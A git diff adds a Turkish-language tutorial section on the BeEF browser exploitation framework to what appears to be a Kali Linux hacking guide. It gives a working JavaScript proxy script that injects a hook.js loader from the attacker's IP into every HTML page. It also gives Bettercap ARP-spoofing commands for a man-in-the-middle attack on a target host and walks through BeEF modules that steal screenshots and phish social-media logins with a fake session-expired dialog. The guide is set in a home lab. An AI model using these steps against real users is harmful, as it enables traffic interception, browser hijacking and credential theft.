@@ -83,6 +83,15 @@
 - [Sosyal Mühendislik](#sosyal-mühendislik)
   - [Görseller ile Dosyayı Birleştirmek](#görseller-ile-dosyayı-birleştirmek)
   - [Uzantıları Değiştirmek](#uzantıları-değiştirmek)
+- [Beef](#beef)
+  - [Ufak Bir Not](#ufak-bir-not)
+  - [Kurulum](#kurulum-1)
+  - [Hedefi Oltaya Takmak](#hedefi-oltaya-takmak)
+  - [JavaScript Enjeksiyonu](#javascript-enjeksiyonu)
+  - [Beef Saldırılarından Bazıları](#beef-saldırılarından-bazıları)
+    - [Ekran Görüntüsü Çalmak](#ekran-görüntüsü-çalmak)
+    - [Diyalog Çıkartmak](#diyalog-çıkartmak)
+    - [Bilgileri Çalmak (Pretty Thieft)](#bilgileri-çalmak-pretty-thieft)
 
 # Giriş
 Bu döküman **Linux** işletim sisteminin **Kali Linux** dağıtımı üzerinde hazırlanmıştır. İlgili sistem bilgileri aşağıda bulunmaktadır.<br>
@@ -739,7 +748,7 @@ Temel komut dizimi şu şekildedir:
 ```
 ### Web Sunucu Kurmak
 - `systemctl start apache2` komutu ile birlikte Kali makinamızda default gelen apache2 sunucusunu başlatabiliriz
-- `cd /var/www/html/` komutu ile www klasörüne geçiyoruz. Sunucumuz içerisindeki dosyalar bu klasörden serve edilir. IP'ye istek gelince bu sunucu altındaki `index.html` gösterilir
+- `cd /var/www/html/` komutu ile www klasörüne geçiyoruz. Sunucumuz içerisindeki dosyalar bu klasörden serve edilir. IP'ye istek gelince default olarak bu dizin altındaki `index.html` gösterilir
 - Makinamızın IP adresine istek atarsak bu dizindeki `index.html` gösterilecektir
 
 ### Bettercap
@@ -974,4 +983,124 @@ Windows makinemde trojan'ı çalıştırıyorum
 Ve başarılı bir şekilde Kali makinemde bağlantıyı yakalıyorum
 
 ![Characters Multi Handler](./assets/40-characters-meterpreter.png)
+
+# Beef
+Beef, Browser Exploitation Framework olarak geçmektedir. Browser'ları sömürmemizi sağlayan bir tool'dur. Hedefimizin browser'ında JavaScript kodları çalıştırarak onu sömürmemizi sağlayacaktır.
+
+## Ufak Bir Not
+Bu bölümde denemelerimizi **İç Ağlarda** yani aynı ağda bağlı olduğumuz sanal Windows makinamıza karşı yapacağız. Dış Ağ saldırılarını alt başlıklarda göreceğiz.
+
+## Kurulum
+Eğer Beef otomatik olarak yüklü gelmez ise [Beef Project](https://github.com/beefproject/beef)'ten projeyi `git clone https://github.com/beefproject/beef.git` diyerek makinemize indirebiliriz
+- `cd beef` diyerek indirdiğimiz proje dizinine giriş yapabiliriz
+- `./install` diyerek executable script dosyasını çalıştırıyoruz ve kurulumu yapıyoruz. Başarılı bir şekilde kurulumu yaptıysak bize şu şekilde bir çıktı verecektir. Default olarak set edilen parolayı değiştirmemiz gerektiği bize söyleniyor.
+
+![Beef Kurulum](./assets/41-beef-kurulum.png)
+
+- `nano config.yaml` komutu ile konfigürasyon dosyamızı açabiliriz. **credentials** altından default olarak set edilen **beef** şifresini ve kullanıcı adını kendi belirlediğimiz bilgilerle değiştiriyoruz ve kaydedip çıkıyoruz
+
+![Beef Conf](./assets/42-beef-conf.png)
+
+- `./beef` diyerek aracımızı çalıştırabiliriz
+
+![Beef Start](./assets/43-beef-start.png)
+
+- Yukarıdaki gibi bir çıktı alacağız. **UI URL** kısmında beef'e ulaşabileceğimiz adres verilmiş olacak. Browserımızdan ilgili adrese gidiyoruz ve `config.yaml` dosyasında set ettiğimiz değerler ile giriş yapıyoruz
+
+![Beef Intro](./assets/44-beef-intro.png)
+
+## Hedefi Oltaya Takmak
+Öncelikle bir web sitesi oluşturmamız lazım. Bu sayede hedef bir bilgisayar bu siteye girdiğinde beef tarafından bize verilen JavaScript kodunu çalıştırabilelim ve hedefimizi oltamıza takmış olalım. Beef'i ilk çalıştırdığımızda bize çalıştırmamız gereken JavaScript kodunun (**HOOK URL -> hook.js**) adresini zaten vermektedir. <br>
+Benim makinam için -> `http://192.168.1.105:3000/hook.js`
+
+![Beef Hook JS](./assets/45-beef-hook-uri.png)
+
+Biz zaten üst [başlıklardan](#web-sunucu-kurmak) Kali makinamızı web sunucu olarak kullanabildiğimizi biliyorduk. Aynı şekilde tekrar bu aşamada web sunucumuzu başlatıyoruz ve dilersek hedefimize göstermek istediğimiz index.html'i oluşturuyor/editliyoruz. Ben içeriğini tek satır olarak değiştirdim.
+```
+root@covid-x:/var/www/html# cat index.html 
+>>> <h1>Merhaba Guzel Kardesim, Hacklendin Gecmis Olsun ^^</h1>
+```
+Peki burada Beef'in olayı nerede? Yukarıda demiştik ki Beef bize `hook.js` adında bir dosya ve bu dosyanın yolunu veriyor. Yapmamız gereken normal bir web sitesine JavaScript kodu ekler gibi bu adresteki `hook.js`'i index.html dosyamızın içeriğine eklemek <br> 
+Bize verdiği adres aslında Beef'i çalıştırdığımız, yani Kali makinamızın IP adresidir. Eğer sizde bu adresi vermez ise `ifconfig` ile IP adresinizi öğrenebilirsiniz ve `http://IP_ADRESINIZ/hook.js` şeklinde kullanabilirsiniz
+
+![Beef Hook JS Injection](./assets/46-beef-hook-js.png)
+
+Ardından Windows Hedef makinamızda bu siteye (yani Kali üzerinde oluşturduğumuz web sunucuya) istek atınca hedefimiz oltaya takılmış olacak ve Beef Panelde gözükecektir. Nasıl istek atacağımızı da [üst başlıklarda](#web-sunucu-kurmak) görmüştük. 
+
+- Windows Makinadan, Kali Makinaya istek atıyoruz ve Kali altında çalışan web sunucumuz içindeki `index.html` serve ediliyor, içerisinden de `hook.js` çağrılıyor
+
+![windows request to kali](./assets/47-windows-istek.png)
+
+- Kali makinamızda çalışan Beef otomatik olarak oltaya takılan makinayı görüyor. Şu anda hedef browser'a karşı ciddi bir güç sahibiyiz. Browser kapanırsa gücümüzü kaybederiz!
+
+![Beef Hooked](./assets/48-kali-hooked.png)
+
+## JavaScript Enjeksiyonu
+Peki illa hedefi bu siteye, adrese sokmak zorunda mıyız? Hayır. MITM tekniği kullanarak JS enjeksiyonu yapmayı görmüştük. Bu tekniği kullanarak Beef tarafından bize verile JavaScript'i `hook.js`'i enjekte edeceğiz. Aşağıda verilen JavaScript kodunu herhangi bir dosyaya kaydediyoruz. Ben `Desktop/my_code.js` olarak kaydettim. Bu JavaScript kodu ve MITM ile kullanıcı her siteye girdiğinde bu JavaScript'i ona enjete edeceğiz. Bu JavaScript'de bize Beef tarafından verilen JavaScript'i kullanıcının girdiği siteye enjekte edecek. Bu sayede hangi siteye girerse girsin Beef ile izleyebileceğiz
+```
+function onResponse(req, res) {
+  if( res.ContentType.indexOf('text/html') == 0 ){
+    var body = res.ReadBody();
+    if( body.indexOf('</head>') != -1 ) {
+      res.Body = body.replace( 
+        '</head>', 
+        '<script type="text/javascript" src="http://BEEF_HOOK_IP_ADRESINIZ:3000/hook.js"></script></head>' 
+      ); 
+    }
+  }
+}
+```
+
+![Custom Js](./assets/49-custom-js.png)
+
+Ardından [Bettercap](#bettercap) sayesinde hedefimize karşı ARP spoof yapıyoruz ve MITM taktiği ile ona Masaüstüne oluşturduğumuz `my_code.js` adlı kodu enjekte ediyoruz. `/root/Desktop/my_code.js` dizini ben Desktop altında my_code.js adında dosya oluşturduğum için bu dizilimi aldı. Siz başka dizin altında başka isimde dosya oluşturursanız sizin dizin değişiklik gösterebilecektir.
+```
+» set arp.spoof.fullduplex true
+» set arp.spoof.targets 192.168.1.218
+» set http.proxy.script /root/Desktop/my_code.js
+» http.proxy on
+» arp.spoof on
+```
+
+Tekrar Beef Panel'e baktığımızda kullanıcının oltaya takılmış olduğunu göreceğiz. Unutmayalım bu taktik de **HTTP** sitelerde işe yarayacaktır. **HTTPS** sitelerde çalıştırmak için [ilgili](#https-kırmak) bölüme bakabiliriz.
+
+![Bettercap ve Beef](./assets/50-beef-custom-js.png)
+
+## Beef Saldırılarından Bazıları
+
+### Ekran Görüntüsü Çalmak
+Beef Panel'de **Commands** sekmesi altında işimize yarayacak bir çok event mevcuttur. **Spyder Eye** hedef browser'dan ScreenShot almamızı sağlar. <br>
+Yeşil Event'lar kesin çalışır anlamına gelmektedir <br>
+Beyaz Event'lar muhtemelen çalışır anlamına gelmektedir <br>
+Turuncu Event'lar düşük bir ihtimalle çalışır anlamındadır <br>
+Kırmızı Event'lar ise denemeye değer anlamına gelmektedir <br>
+
+![Beef Commands](./assets/51-beef-commands.png)
+
+İlgili event'i seçiyoruz ve sağ alttan **execute** butonuna tıklıyoruz. Bizim için ilgili event'i çalıştıracaktır. Ortadaki kolonda event sonuçlarını görebiliriz. Bizim yaptığımız event sonucunda ise hedef browser'dan ekran görüntüsünü çalmış oldu
+
+![Beef Command Execute](./assets/52-beef-execute-command.png)
+
+
+### Diyalog Çıkartmak
+Commands altından **Hooked Domain > Create Alert Dialog** eventine geliyoruz. Diyalog metnimizi girip execute ediyoruz
+- Beef tarafında görüntü
+
+![Beef Dialog](./assets/53-beef-dialog.png)
+
+- Hedef browser tarafında görüntü
+
+![Beef Dialog Target](./assets/54-beef-target.png)
+
+### Bilgileri Çalmak (Pretty Thieft)
+Sosyal medya hesaplarını bu yöntem ile çalabiliriz. Kısaca bize oturum süresi doldu yeniden giriş yap der. Diyalogtan girilen bilgileri arka planda alıyoruz <br>
+Socail Engineering > Pretty Thieft giderek bu event'i çalıştırabiliriz. Hangi sosyal medya için diyalog açacağımızı, hangi renkte olacağını ve logosunu set edebiliriz.
+
+- Beef tarafında görünüm 
+
+![Beef Pretty Thieft](./assets/55-beef-pretty-thieft.png)
+
+- Hedef Makinada Görünüm
+
+![Beef Pretty Target](./assets/56-beef-pretty-target.png)
 
